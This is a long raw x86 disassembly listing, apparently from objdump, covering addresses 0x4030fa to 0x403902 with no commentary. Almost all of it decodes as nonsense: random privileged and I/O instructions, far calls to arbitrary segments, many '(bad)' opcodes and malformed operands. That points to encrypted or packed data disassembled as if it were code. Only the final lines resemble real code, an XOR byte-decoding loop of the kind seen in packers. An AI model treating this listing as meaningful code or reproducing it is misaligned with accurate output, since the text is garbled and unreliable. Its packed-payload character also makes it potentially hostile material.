  4030fa:	repz xchg esi,eax
  4030fc:	iret   
  4030fd:	leave  
  4030fe:	inc    esp
  4030ff:	mov    bl,0x5c
  403101:	outs   dx,DWORD PTR ds:[esi]
  403102:	aas    
  403103:	add    ch,BYTE PTR [ebx+edi*4]
  403106:	loope  0x40316e
  403108:	or     eax,0xf41d24c3
  40310d:	cmp    ch,BYTE PTR [ecx-0xc]
  403110:	in     eax,0x85
  403112:	xor    DWORD PTR [esi-0x1bc7e044],esi
  403118:	push   esp
  403119:	sti    
  40311a:	jmp    0x572a1ab5
  40311f:	test   ch,bl
  403121:	push   cs
  403122:	lds    edx,FWORD PTR [edi]
  403124:	xor    DWORD PTR ds:0xd7a0bfc0,edi
  40312a:	call   0xa361:0x96ba032b
  403131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403132:	or     edx,esp
  403134:	pop    edi
  403135:	int    0x92
  403137:	mov    WORD PTR [ebp+0x33],es
  40313a:	pop    ecx
  40313b:	xchg   esp,eax
  40313c:	and    al,0x5a
  40313e:	mov    dh,0xe3
  403140:	sub    al,0xd2
  403142:	inc    ebp
  403143:	cmp    esi,DWORD PTR ds:0x55765f08
  403149:	cmp    BYTE PTR [eax+0x30],dl
  40314c:	mov    ah,0xf
  40314e:	pop    esi
  40314f:	inc    esp
  403150:	jnp    0x4031a1
  403152:	test   eax,0xf9f89d00
  403157:	fsub   DWORD PTR [esi]
  403159:	ins    DWORD PTR es:[edi],dx
  40315a:	addr16 inc ecx
  40315c:	pop    edx
  40315d:	(bad)  
  40315f:	jo     0x4031d4
  403161:	rol    edx,0x7
  403164:	adc    DWORD PTR [ecx+0x3ad983e1],0x4456ecab
  40316e:	(bad)  
  40316f:	xor    edi,ecx
  403171:	jmp    0x403527
  403176:	data16 aas 
  403178:	in     eax,dx
  403179:	int3   
  40317a:	jne    0x403166
  40317c:	popa   
  40317d:	jno    0x4031dd
  40317f:	imul   esp,DWORD PTR [ebx],0xc282d987
  403185:	mov    esp,0x7070153e
  40318a:	xchg   edi,eax
  40318b:	jge    0x4031fd
  40318d:	jo     0x40311d
  40318f:	inc    ecx
  403190:	out    0x3d,eax
  403192:	sbb    edi,edi
  403194:	loop   0x40317d
  403196:	jns    0x403126
  403198:	(bad)  
  403199:	call   0x93b7:0xfa19c9e1
  4031a0:	cmc    
  4031a1:	mov    ds:0x96f1dc35,al
  4031a6:	or     BYTE PTR [ebp-0x6b4cc335],bh
  4031ac:	enter  0xa742,0xb9
  4031b0:	lds    eax,FWORD PTR [ebx]
  4031b2:	sub    DWORD PTR [ecx-0x6952eb7a],0xffffffbe
  4031b9:	ss push ebp
  4031bb:	lds    ecx,FWORD PTR [ebp+0x46]
  4031be:	push   ebx
  4031bf:	dec    edx
  4031c0:	or     ch,ah
  4031c2:	pop    esp
  4031c3:	and    ecx,ebx
  4031c5:	and    edi,esp
  4031c7:	jl     0x403156
  4031c9:	fsub   QWORD PTR es:[ecx+eiz*4]
  4031cd:	and    esi,esp
  4031cf:	pop    esi
  4031d0:	adc    eax,0x5e37fa50
  4031d5:	int3   
  4031d6:	test   DWORD PTR [ebx+0x25],eax
  4031d9:	mov    esi,0x85a0fb06
  4031de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031df:	loope  0x40318a
  4031e1:	add    edx,eax
  4031e3:	(bad)  
  4031e4:	fsub   DWORD PTR [esi-0x54]
  4031e7:	imul   ebp,DWORD PTR ds:[esp+ebp*8-0x24167deb],0x5eac7e17
  4031f3:	out    0x81,eax
  4031f5:	pop    ds
  4031f6:	ins    DWORD PTR es:[edi],dx
  4031f7:	push   edi
  4031f8:	cdq    
  4031f9:	inc    ebx
  4031fa:	(bad)  
  4031fb:	push   edx
  4031fc:	xchg   ebx,eax
  4031fd:	outs   dx,BYTE PTR ds:[esi]
  4031fe:	push   ss
  4031ff:	fdiv   QWORD PTR [eax]
  403201:	popa   
  403202:	gs pusha 
  403204:	mov    ebp,0x51f66a9e
  403209:	imul   ebx,DWORD PTR [eax+0x909bfe0],0xc56db4e6
  403213:	sub    edx,esp
  403215:	fidivr WORD PTR ds:0xcf78c320
  40321b:	sub    DWORD PTR [edi-0x68],esp
  40321e:	xor    eax,0x8b7aafdd
  403223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403224:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  403226:	mov    bh,0x88
  403228:	mov    edx,db3
  40322b:	in     eax,dx
  40322c:	and    BYTE PTR [esi],cl
  40322e:	mov    bl,0x59
  403230:	pusha  
  403231:	call   0xd285:0x9a5b87cf
  403238:	dec    eax
  403239:	test   BYTE PTR [ebp-0x68],bh
  40323c:	out    dx,al
  40323d:	mov    edx,DWORD PTR [ebx+0x66]
  403240:	xchg   edi,eax
  403241:	cld    
  403242:	add    al,0x1e
  403244:	xor    al,0xf3
  403246:	mov    ah,0x98
  403248:	inc    esp
  403249:	jnp    0x403233
  40324b:	dec    edi
  40324c:	mov    al,ds:0x30200b41
  403251:	repnz scas eax,DWORD PTR es:[edi]
  403253:	daa    
  403254:	in     eax,0x2c
  403256:	in     al,0x1d
  403258:	scas   eax,DWORD PTR es:[edi]
  403259:	or     dh,BYTE PTR [edi-0x6e]
  40325c:	test   eax,0x388463db
  403261:	mov    ecx,0x8e39e8b5
  403266:	sub    dh,al
  403268:	(bad)
  40326c:	xchg   DWORD PTR [edx-0x68b815c1],eax
  403272:	push   ss
  403273:	vcvtps2dq ymm1,YMMWORD PTR [ecx+0x131a3912]
  40327b:	xor    edi,esi
  40327d:	sub    al,0xc1
  40327f:	sar    DWORD PTR [eax-0x3924f2f2],0x96
  403286:	jnp    0x403270
  403288:	xchg   ebx,eax
  403289:	lods   eax,DWORD PTR ds:[esi]
  40328a:	ss push 0x18a408d4
  403290:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403291:	enter  0xeac7,0x96
  403295:	sbb    al,0x6f
  403297:	hlt    
  403298:	jns    0x4032cc
  40329a:	push   ds
  40329b:	into   
  40329c:	sahf   
  40329d:	pushf  
  40329e:	loopne 0x40324c
  4032a0:	or     al,0x8c
  4032a2:	sbb    al,0x6b
  4032a4:	test   BYTE PTR [ebx-0x7c708f87],0x73
  4032ab:	dec    ebx
  4032ac:	mov    DWORD PTR [eax],0xd4e85c6f
  4032b2:	fisttp WORD PTR [esi]
  4032b4:	push   0xffffff85
  4032b6:	out    0x81,eax
  4032b8:	fld    QWORD PTR [edi+0x43b3c079]
  4032be:	mov    ch,0x4
  4032c0:	sub    DWORD PTR ds:0xc8f4a46f,0x97e60a90
  4032ca:	sub    ebx,ecx
  4032cc:	aad    0x67
  4032ce:	pop    esp
  4032cf:	int3   
  4032d0:	fwait
  4032d1:	sar    DWORD PTR [esi-0x53cc1fca],0x34
  4032d8:	fst    DWORD PTR [esi+0x7f8ef7f5]
  4032de:	sti    
  4032df:	pop    ebp
  4032e0:	mov    esp,0xce99f1e4
  4032e5:	xor    al,0x48
  4032e7:	sub    eax,0xec1e1576
  4032ec:	in     al,dx
  4032ed:	imul   esi,DWORD PTR [esp+edx*4+0x76c4069c],0x5fe1b5f8
  4032f8:	xchg   esp,eax
  4032f9:	repz repz sbb eax,0x5d7b1030
  403300:	xchg   esi,eax
  403301:	sbb    BYTE PTR [eax+0x10],al
  403304:	stos   DWORD PTR es:[edi],eax
  403305:	in     al,dx
  403306:	push   ebx
  403307:	adc    DWORD PTR [edx+esi*4-0x46],0x624745d3
  40330f:	fldcw  WORD PTR [esi-0x173e9b3e]
  403315:	imul   edx,DWORD PTR ds:0xad748855,0xe6b11264
  40331f:	add    eax,DWORD PTR [ebp-0x6c]
  403322:	xchg   DWORD PTR [edx],edi
  403324:	ja     0x403339
  403326:	out    0xdf,al
  403328:	ins    DWORD PTR es:[edi],dx
  403329:	mov    bl,0x69
  40332b:	mov    cl,0xd7
  40332d:	xchg   edx,eax
  40332e:	xor    edi,esi
  403330:	repnz scas al,BYTE PTR es:[edi]
  403332:	push   0x3b
  403334:	test   eax,esp
  403336:	mov    ds:0x6251f024,al
  40333b:	cdq    
  40333c:	or     BYTE PTR [esi-0x19265edb],dh
  403342:	or     DWORD PTR [ebx],ebx
  403344:	bound  esi,QWORD PTR [edi+0x61595064]
  40334a:	mov    BYTE PTR [eax],dl
  40334c:	dec    eax
  40334d:	shl    esi,0xab
  403350:	inc    ebx
  403351:	pop    esi
  403352:	call   0x791e3754
  403357:	lods   eax,DWORD PTR ds:[esi]
  403358:	or     BYTE PTR [esi-0x6d],al
  40335b:	je     0x4032f0
  40335d:	mov    dl,0x6f
  40335f:	sub    al,0xc9
  403361:	es fwait
  403363:	jno    0x4033c4
  403365:	sub    edi,DWORD PTR [ebp*8+0xb39ac03]
  40336c:	or     eax,0x50e3b640
  403371:	fidivr DWORD PTR [esi]
  403373:	ud2    
  403375:	dec    eax
  403376:	imul   ecx,DWORD PTR [edi],0x6b
  403379:	arpl   bx,di
  40337b:	out    dx,eax
  40337c:	xlat   BYTE PTR ds:[ebx]
  40337d:	jp     0x4033c6
  40337f:	or     DWORD PTR [edx+ebx*2],esi
  403382:	add    dl,ch
  403384:	xchg   edx,eax
  403385:	cld    
  403386:	retf   
  403387:	or     al,0xc5
  403389:	cdq    
  40338a:	jle    0x4033d6
  40338c:	bound  eax,QWORD PTR [edx]
  40338e:	outs   dx,BYTE PTR ds:[esi]
  40338f:	int    0xc2
  403391:	and    eax,0x9eb1f39b
  403396:	cmc    
  403397:	add    bh,BYTE PTR [edx-0x2c6c1657]
  40339d:	stos   BYTE PTR es:[edi],al
  40339e:	dec    edi
  40339f:	and    ah,BYTE PTR [eax+esi*4]
  4033a2:	dec    esi
  4033a3:	dec    esi
  4033a4:	iret   
  4033a5:	and    DWORD PTR [edx],esi
  4033a7:	jle    0x403398
  4033a9:	rcr    DWORD PTR [ebp+0x6d98f524],cl
  4033af:	lock or dl,cl
  4033b2:	pop    edx
  4033b3:	inc    esp
  4033b4:	shl    DWORD PTR [ebx-0x376ad449],cl
  4033ba:	repz in al,0x46
  4033bd:	jo     0x4033d5
  4033bf:	push   es
  4033c0:	cmp    al,0x28
  4033c2:	push   0xffffffb7
  4033c4:	push   esi
  4033c5:	sub    BYTE PTR [esi],cl
  4033c7:	in     eax,0xb5
  4033c9:	(bad)  
  4033ca:	mov    bl,0x99
  4033cc:	stc    
  4033cd:	add    ecx,DWORD PTR [ebx+0x34eda985]
  4033d3:	sbb    al,0x2
  4033d5:	push   ss
  4033d6:	and    eax,0xed140e6d
  4033db:	scas   eax,DWORD PTR es:[edi]
  4033dc:	cdq    
  4033dd:	cmp    eax,0x9ab088f5
  4033e2:	sti    
  4033e3:	adc    dh,cl
  4033e5:	imul   DWORD PTR [edx+0x50]
  4033e8:	push   edx
  4033e9:	fs pusha 
  4033eb:	aad    0x5f
  4033ed:	daa    
  4033ee:	inc    edx
  4033ef:	aas    
  4033f0:	inc    ecx
  4033f1:	or     ecx,DWORD PTR [edi+0x14d8ae11]
  4033f7:	xchg   edi,eax
  4033f8:	mov    ch,0x14
  4033fa:	sahf   
  4033fb:	daa    
  4033fc:	sar    bl,1
  4033fe:	cwde   
  4033ff:	xor    BYTE PTR [eax+0x2e],cl
  403402:	mov    ds:0x6df9e14,eax
  403407:	dec    esp
  403408:	jl     0x403391
  40340a:	retf   
  40340b:	cwde   
  40340c:	mov    edi,0x9ab48065
  403411:	xchg   edx,eax
  403412:	(bad)  
  403413:	push   edi
  403414:	sbb    eax,0xc2c58137
  403419:	jge    0x4033cf
  40341b:	shl    BYTE PTR [esi],1
  40341d:	imul   ebx,DWORD PTR [edi],0xaf00af2c
  403423:	adc    BYTE PTR [ecx-0x5469ee66],cl
  403429:	sub    eax,0x287fb33c
  40342e:	outs   dx,DWORD PTR ds:[esi]
  40342f:	popa   
  403430:	fist   DWORD PTR [ecx+0xc]
  403433:	out    dx,al
  403434:	std    
  403435:	and    DWORD PTR [edx+0x4a7f38e3],edx
  40343b:	cmp    al,0x9a
  40343d:	add    dl,al
  40343f:	ret    
  403440:	sar    DWORD PTR [eax],0xc1
  403443:	fst    QWORD PTR [ecx+edx*2-0x57a33c68]
  40344a:	xchg   edi,eax
  40344b:	test   DWORD PTR [esi+0x5d],ebx
  40344e:	es addr16 sahf 
  403451:	(bad)  
  403452:	(bad)  
  403454:	mov    ah,0x22
  403456:	(bad)  
  403457:	cld    
  403458:	je     0x4033e7
  40345a:	sub    al,0x9d
  40345c:	shl    BYTE PTR [esi+eiz*2],cl
  40345f:	cdq    
  403460:	fwait
  403461:	imul   ebp,DWORD PTR [esp+eax*8-0x5986e9cd],0x31004c91
  40346c:	addr16 out dx,eax
  40346e:	neg    DWORD PTR [edx+0x4e]
  403471:	mov    ebx,0xaa471bd0
  403476:	and    bh,BYTE PTR cs:[edi]
  403479:	addr16 mov al,0x3e
  40347c:	or     bh,BYTE PTR [ebx-0x78912515]
  403482:	lea    esp,[eax+0x19dd0412]
  403488:	aaa    
  403489:	test   bh,dl
  40348b:	(bad)  
  40348c:	hlt    
  40348d:	mov    ds:0x78907b19,eax
  403492:	into   
  403493:	es lock leave 
  403496:	shl    ecx,1
  403498:	daa    
  403499:	cli    
  40349a:	aas    
  40349b:	mov    eax,ds:0x6117788c
  4034a0:	ja     0x40350f
  4034a2:	and    esp,0x643a21f9
  4034a8:	push   ebp
  4034a9:	icebp  
  4034aa:	repnz xor ch,BYTE PTR [esi-0x45]
  4034ae:	sub    eax,0x792ad808
  4034b3:	push   cs
  4034b4:	je     0x40344e
  4034b6:	es mov edi,0x87852cd9
  4034bc:	pop    eax
  4034bd:	xor    eax,0x9577b7a1
  4034c2:	mov    es,esi
  4034c4:	leave  
  4034c5:	and    ah,BYTE PTR [esi-0x702a1a8c]
  4034cb:	out    0x3d,eax
  4034cd:	xchg   ecx,eax
  4034ce:	jecxz  0x403473
  4034d0:	xchg   edi,eax
  4034d1:	outs   dx,DWORD PTR ds:[esi]
  4034d2:	int    0x48
  4034d4:	inc    esp
  4034d5:	add    dl,BYTE PTR [esi+0x45]
  4034d8:	cmp    DWORD PTR [edi-0x8],eax
  4034db:	adc    BYTE PTR [edx-0x20],dh
  4034de:	mov    eax,0x63fffcf2
  4034e3:	add    BYTE PTR [esi+0x501c25d2],al
  4034e9:	test   al,0x3d
  4034eb:	out    0x5d,eax
  4034ed:	xchg   esi,eax
  4034ee:	daa    
  4034ef:	test   cl,dh
  4034f1:	daa    
  4034f2:	cmp    eax,0x4c46c40c
  4034f7:	int    0xa0
  4034f9:	pusha  
  4034fa:	jmp    edi
  4034fc:	sub    al,BYTE PTR [ecx-0x445e63e]
  403502:	sbb    bh,BYTE PTR [edi-0x483ab415]
  403508:	loop   0x403589
  40350a:	push   es
  40350b:	sbb    eax,0x275ce8fb
  403510:	and    eax,0xf601f329
  403515:	dec    ebp
  403516:	push   ds
  403517:	lea    ecx,[esi+0x16]
  40351a:	pop    esp
  40351b:	popf   
  40351c:	mov    dl,0x59
  40351e:	test   eax,0x4474cb95
  403523:	add    BYTE PTR ds:0xfe031421,bh
  403529:	mov    esi,DWORD PTR [ebp+0x8]
  40352c:	imul   edi,edx
  40352f:	mov    ebx,DWORD PTR [ebp+0xc]
  403532:	jmp    0x4038e8
  403537:	jle    0x4034ce
  403539:	mov    esi,0x45d75507
  40353e:	xchg   ebp,eax
  40353f:	icebp  
  403540:	repz cs jle 0x403544
  403544:	xor    DWORD PTR ds:0x7012556c,ecx
  40354a:	jo     0x4034e3
  40354c:	jge    0x4035be
  40354e:	jo     0x403576
  403550:	popf   
  403551:	mov    bl,0x74
  403553:	dec    ecx
  403554:	jl     0x40359a
  403556:	mov    cl,BYTE PTR [edi+0x3b]
  403559:	pop    esi
  40355a:	and    dh,BYTE PTR [edx]
  40355c:	ficom  DWORD PTR [edi]
  40355e:	addr16 or dl,bl
  403561:	shl    dl,1
  403563:	jae    0x403581
  403565:	test   eax,0xaba96e04
  40356a:	push   0xfffffff6
  40356c:	lahf   
  40356d:	dec    cx
  40356f:	xor    dh,BYTE PTR [ecx-0x7f547e6d]
  403575:	into   
  403576:	push   edi
  403577:	or     bl,dh
  403579:	lods   al,BYTE PTR ds:[esi]
  40357a:	test   al,0x66
  40357c:	mov    bl,0xa1
  40357e:	stc    
  40357f:	lods   eax,DWORD PTR ds:[esi]
  403580:	xchg   edx,eax
  403581:	retf   0x6a8f
  403584:	out    dx,al
  403585:	je     0x403563
  403587:	push   esi
  403588:	fidiv  DWORD PTR [ebx-0x23]
  40358b:	dec    eax
  40358c:	mov    al,BYTE PTR fs:[eax+0x75ad3f58]
  403593:	dec    esp
  403594:	icebp  
  403595:	add    eax,esp
  403597:	test   ch,dh
  403599:	daa    
  40359a:	adc    eax,ebx
  40359c:	fbld   TBYTE PTR [eax+eax*2+0x4b70167c]
  4035a3:	push   0x2f
  4035a5:	ja     0x40357d
  4035a7:	inc    edx
  4035a8:	push   esi
  4035a9:	mov    ch,0xb7
  4035ab:	mov    ebx,0x3d42f887
  4035b0:	or     BYTE PTR [ecx-0x3e],cl
  4035b3:	mov    ds:0xad1ba0b5,al
  4035b8:	fwait
  4035b9:	cmp    BYTE PTR [esi-0x3],0x1f
  4035bd:	cs ins BYTE PTR es:[edi],dx
  4035bf:	popa   
  4035c0:	inc    edx
  4035c1:	add    BYTE PTR [edx+0x37942ce3],0x8d
  4035c8:	adc    eax,0x2c9aa0cf
  4035cd:	cs jmp 0x40362c
  4035d0:	inc    eax
  4035d1:	fldpi  
  4035d3:	mov    dh,0xe2
  4035d5:	enter  0x915,0xa8
  4035d9:	div    bh
  4035db:	leave  
  4035dc:	pop    esi
  4035dd:	or     BYTE PTR [edx-0x159e09e6],al
  4035e3:	sbb    DWORD PTR [esi],edi
  4035e5:	and    bl,BYTE PTR [ebp+0x66]
  4035e8:	pop    esp
  4035e9:	stc    
  4035ea:	iret   
  4035eb:	or     DWORD PTR [esi+edi*1-0x3334ac36],0x74
  4035f3:	and    eax,0x17c7638
  4035f8:	(bad)  
  4035f9:	jmp    0xaf43:0xffa300c0
  403600:	cmp    edx,edx
  403602:	push   edx
  403603:	into   
  403604:	push   eax
  403605:	pop    esp
  403606:	mov    edi,0xc040c04c
  40360b:	icebp  
  40360c:	test   BYTE PTR [eax],dh
  40360e:	test   al,0x9b
  403610:	popf   
  403611:	shr    DWORD PTR [esi],0xae
  403614:	aaa    
  403615:	sub    BYTE PTR [eax+0x1e],bl
  403618:	sti    
  403619:	jae    0x4035c7
  40361b:	pop    DWORD PTR [esi]
  40361d:	mov    ebx,0xf588c7e
  403622:	ret    
  403623:	cmc    
  403624:	outs   dx,BYTE PTR ds:[esi]
  403625:	push   eax
  403626:	push   esp
  403627:	jb     0x4035d4
  403629:	or     eax,0x19c119d4
  40362e:	mov    ?,WORD PTR [eax]
  403630:	adc    DWORD PTR [edx],esi
  403632:	jl     0x40367e
  403634:	dec    edx
  403635:	xchg   edx,eax
  403636:	mov    ebx,0x51b08229
  40363b:	mov    al,0x3d
  40363d:	jno    0x40368f
  40363f:	cli    
  403640:	bound  eax,QWORD PTR [ecx-0x10a8e58e]
  403646:	sbb    ebp,DWORD PTR [esi]
  403648:	pop    esp
  403649:	fistp  DWORD PTR [ecx]
  40364b:	mov    DWORD PTR [esi-0x111f240b],esi
  403651:	std    
  403652:	into   
  403653:	out    0xbb,eax
  403655:	jno    0x403662
  403657:	ret    0x2109
  40365a:	sub    esp,DWORD PTR ds:0xdb27f05a
  403660:	xchg   edi,eax
  403661:	or     bl,BYTE PTR [ecx]
  403663:	cmc    
  403664:	aas    
  403665:	mov    edx,0x3227b120
  40366a:	je     0x4036c5
  40366c:	mov    al,ds:0x2a2cb6d1
  403671:	sbb    edx,DWORD PTR [ecx+0x58]
  403674:	sbb    al,0xee
  403676:	cli    
  403677:	jns    0x4036a8
  403679:	push   eax
  40367a:	xchg   DWORD PTR [esi+0x51ff2d26],eax
  403680:	mov    DWORD PTR [edx+ecx*4],edi
  403683:	div    cl
  403685:	shl    DWORD PTR [ebx+0x6c],0x74
  403689:	jbe    0x40363c
  40368b:	sub    al,BYTE PTR [ecx+0x25]
  40368e:	jnp    0x40368d
  403690:	push   esi
  403691:	fadd   QWORD PTR [ebp+0x1c2bcf9f]
  403697:	(bad)  
  403698:	adc    al,0x29
  40369a:	jno    0x40365d
  40369c:	cmp    al,0x57
  40369e:	call   0x45fe:0x9ce5a402
  4036a5:	adc    cl,BYTE PTR [ebx+0x4abbaac4]
  4036ab:	or     DWORD PTR [ebp-0x33],0x34900463
  4036b2:	in     al,0x51
  4036b4:	scas   al,BYTE PTR es:[edi]
  4036b5:	xlat   BYTE PTR ds:[ebx]
  4036b6:	lods   eax,DWORD PTR ds:[esi]
  4036b7:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4036b9:	mov    bl,0xb1
  4036bb:	sub    ecx,edx
  4036bd:	push   eax
  4036be:	cmp    al,0xba
  4036c0:	out    dx,al
  4036c1:	push   edi
  4036c2:	pushf  
  4036c3:	cld    
  4036c4:	mov    esi,DWORD PTR [edx+0x72]
  4036c7:	rcl    DWORD PTR [ebx],1
  4036c9:	xor    ch,BYTE PTR [ecx-0x4d]
  4036cc:	(bad)  
  4036cd:	mov    ?,edi
  4036cf:	push   esp
  4036d0:	popf   
  4036d1:	fild   WORD PTR [eax+ebp*1]
  4036d4:	and    eax,esp
  4036d6:	pop    esp
  4036d7:	mov    ebx,0xe0bdb985
  4036dc:	icebp  
  4036dd:	sub    ah,dh
  4036df:	les    ebp,FWORD PTR [edi-0x42]
  4036e2:	jp     0x4036f5
  4036e4:	fstp   QWORD PTR [ecx]
  4036e6:	mov    ebp,0xdc8a10a7
  4036eb:	adc    edx,DWORD PTR ds:0xdc0eb629
  4036f1:	cmp    ebp,esi
  4036f3:	xchg   BYTE PTR cs:[ecx+0x79],ch
  4036f7:	cs xchg esi,eax
  4036f9:	ins    BYTE PTR es:[edi],dx
  4036fa:	sub    ch,bl
  4036fc:	mov    al,BYTE PTR [ecx-0x79470382]
  403702:	xchg   ebx,eax
  403703:	aad    0x51
  403705:	push   ebp
  403706:	pop    esi
  403707:	ins    BYTE PTR es:[edi],dx
  403708:	push   ss
  403709:	push   eax
  40370a:	and    al,BYTE PTR [ecx+0x246b6468]
  403710:	cmp    edi,DWORD PTR [ebx+0x6187ad1e]
  403716:	icebp  
  403717:	adc    eax,DWORD PTR [ebx+0x68]
  40371a:	repz xchg ecx,eax
  40371c:	pop    edi
  40371d:	mov    bl,0x5f
  40371f:	test   eax,0xd435e122
  403724:	loop   0x4036bc
  403726:	push   esi
  403727:	outs   dx,BYTE PTR ds:[esi]
  403728:	and    ecx,ecx
  40372a:	stc    
  40372b:	daa    
  40372c:	push   0x2e1ab240
  403731:	dec    eax
  403732:	inc    ebx
  403733:	loope  0x403785
  403735:	xor    BYTE PTR [edx],cl
  403737:	test   al,0xd2
  403739:	inc    esi
  40373a:	in     al,0x9a
  40373c:	jge    0x403764
  40373e:	pop    ebx
  40373f:	cmc    
  403740:	pop    ds
  403741:	cmp    ch,BYTE PTR [esi+0x72]
  403744:	adc    BYTE PTR [edx],dh
  403746:	call   0x96c8:0xdf0a9489
  40374d:	outs   dx,BYTE PTR ds:[esi]
  40374e:	aad    0x1d
  403750:	jmp    0x4036fc
  403752:	hlt    
  403753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403754:	fistp  WORD PTR [edi-0x35b4d43f]
  40375a:	mov    ebx,0x63a69ceb
  40375f:	xchg   DWORD PTR [esi+0x1f],ecx
  403762:	frstor [edx]
  403764:	scas   eax,DWORD PTR es:[edi]
  403765:	dec    ebp
  403766:	cdq    
  403767:	cwde   
  403768:	sub    BYTE PTR [edx-0x733795e9],ch
  40376e:	lahf   
  40376f:	adc    edx,eax
  403771:	cmovno edx,DWORD PTR [ebp-0x7bb2c99e]
  403778:	out    dx,al
  403779:	rol    BYTE PTR [edi],1
  40377b:	inc    ecx
  40377c:	pusha  
  40377d:	push   eax
  40377e:	jbe    0x403720
  403780:	push   esp
  403781:	pop    edi
  403782:	sub    esp,DWORD PTR [ebx-0x7fbbad3f]
  403788:	pusha  
  403789:	mov    edi,0x3136eb02
  40378e:	push   0x66
  403790:	mov    ds:0xccdf0da3,eax
  403795:	sbb    edi,ecx
  403797:	iret   
  403798:	xchg   ebp,eax
  403799:	xchg   esp,eax
  40379a:	add    al,0x11
  40379c:	into   
  40379d:	adc    edx,eax
  40379f:	jmp    0x4037ba
  4037a1:	ret    0xfaed
  4037a4:	cmp    al,0xb8
  4037a6:	xchg   edi,eax
  4037a7:	push   0x47
  4037a9:	in     al,dx
  4037aa:	mov    ebp,esp
  4037ac:	test   eax,0x334e93e6
  4037b1:	dec    edi
  4037b2:	ins    DWORD PTR es:[edi],dx
  4037b3:	in     eax,0x2a
  4037b5:	(bad)  
  4037b6:	mov    bh,0x66
  4037b8:	push   eax
  4037b9:	sbb    BYTE PTR [ebx],al
  4037bb:	inc    ecx
  4037bc:	push   0xffffffff
  4037be:	push   ds
  4037bf:	mov    WORD PTR [edx],fs
  4037c1:	enter  0x1617,0x29
  4037c5:	mov    eax,ds:0x234a8b42
  4037ca:	sub    BYTE PTR [ebp+0x7318b7d8],0xe8
  4037d1:	imul   eax,DWORD PTR ds:[edx+0x14],0x67
  4037d6:	data16 ficom WORD PTR [esi+0x5f]
  4037da:	sbb    edx,DWORD PTR [ebx+0x1b552221]
  4037e0:	mov    ds:0x9ee1127d,al
  4037e5:	sub    eax,0x8dacb151
  4037ea:	add    al,0x3e
  4037ec:	or     eax,ebp
  4037ee:	shr    DWORD PTR [eax-0x1c5a9057],0xd3
  4037f5:	pop    eax
  4037f6:	lods   al,BYTE PTR ds:[esi]
  4037f7:	mov    dh,0x87
  4037f9:	ds pop ebx
  4037fb:	mov    dl,0xb4
  4037fd:	pop    esi
  4037fe:	xchg   edx,eax
  4037ff:	and    ch,BYTE PTR [edx+0x2e]
  403802:	push   bp
  403804:	in     al,dx
  403805:	mov    ds:0x5fa8c2cc,eax
  40380a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40380b:	or     dl,ch
  40380d:	pop    esp
  40380e:	mov    al,ds:0x672d0ca4
  403813:	cmp    ecx,DWORD PTR [esi+0x58]
  403816:	jnp    0x4037b8
  403818:	push   0x49
  40381a:	cmc    
  40381b:	xor    BYTE PTR [esi+0x73668e10],dh
  403821:	mov    al,0x22
  403823:	gs (bad) 
  403825:	lock jb 0x403821
  403828:	and    al,ch
  40382a:	mov    al,0xe0
  40382c:	mov    al,0x68
  40382e:	arpl   WORD PTR [edx-0x3c6fc412],dx
  403834:	and    dl,BYTE PTR [edx+0x7f34530]
  40383a:	lahf   
  40383b:	stos   BYTE PTR es:[edi],al
  40383c:	retf   
  40383d:	ds push cs
  40383f:	neg    BYTE PTR [ebp+edx*2+0x1ca5343b]
  403846:	loope  0x4038a0
  403848:	adc    edx,DWORD PTR [ebx-0x26a2d69a]
  40384e:	sub    DWORD PTR [esi-0x5e],edi
  403851:	add    ebx,ebp
  403853:	push   ecx
  403854:	test   al,0x42
  403856:	loopne 0x4037f3
  403858:	test   al,0x50
  40385a:	xor    ah,BYTE PTR [ebx]
  40385c:	hlt    
  40385d:	pop    ebp
  40385e:	nop
  40385f:	in     al,dx
  403860:	outs   dx,DWORD PTR ds:[esi]
  403861:	std    
  403862:	dec    ebx
  403863:	out    0x2,eax
  403865:	inc    edi
  403866:	retf   
  403867:	fcomp  st(2)
  403869:	test   al,0x48
  40386b:	lods   eax,DWORD PTR ds:[esi]
  40386c:	in     al,0x1
  40386e:	mov    esp,0x2d864eb
  403873:	in     eax,dx
  403874:	cmp    edx,DWORD PTR [ebx+esi*4-0x71]
  403878:	gs inc eax
  40387a:	je     0x403861
  40387c:	xlat   BYTE PTR ds:[ebx]
  40387d:	mov    bl,0xa5
  40387f:	mov    ch,0x1e
  403881:	mov    esp,0x59d00836
  403886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403887:	(bad)  
  403888:	sbb    DWORD PTR gs:[eax-0x4b],ebp
  40388c:	xchg   edi,eax
  40388d:	imul   ebx,DWORD PTR [eax+esi*4-0x7d],0x8
  403892:	xor    eax,0x313e20be
  403897:	mov    ah,0xdc
  403899:	rcr    DWORD PTR [eax],1
  40389b:	adc    ch,BYTE PTR [eax-0x25d2a090]
  4038a1:	(bad)  [eax-0x2bb3d855]
  4038a7:	sub    al,0x6f
  4038a9:	add    dh,BYTE PTR [ebp-0x2b723289]
  4038af:	inc    BYTE PTR [edi+0x2facf6c7]
  4038b5:	or     eax,0x4fefb84f
  4038ba:	imul   edi,ecx,0x2c
  4038bd:	mov    dl,0x54
  4038bf:	sbb    ch,BYTE PTR [ebp+eax*4+0x351c84c8]
  4038c6:	imul   edi,DWORD PTR [eax],0x60
  4038c9:	aas    
  4038ca:	test   DWORD PTR ss:[eax+ebx*1+0x50fa357d],edx
  4038d2:	shl    BYTE PTR [edx+0x27],cl
  4038d5:	mov    al,ds:0x439b748
  4038da:	sbb    dl,BYTE PTR [edx]
  4038dc:	fstp   QWORD PTR [ebp+0x22]
  4038df:	jl     0x4038ce
  4038e1:	xchg   edi,eax
  4038e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038e3:	mov    ds:0xb56cb624,eax
  4038e8:	xor    eax,ecx
  4038ea:	add    eax,edx
  4038ec:	mov    al,BYTE PTR [ebx+eax*1+0x32729c]
  4038f3:	mov    BYTE PTR [edi+esi*1],al
  4038f6:	mov    eax,DWORD PTR [ebp-0x4]
  4038f9:	xor    eax,ecx
  4038fb:	lea    edx,[edx+eax*1+0x32729c]
  403902:	mov    eax,DWORD PTR [ebp-0x4]
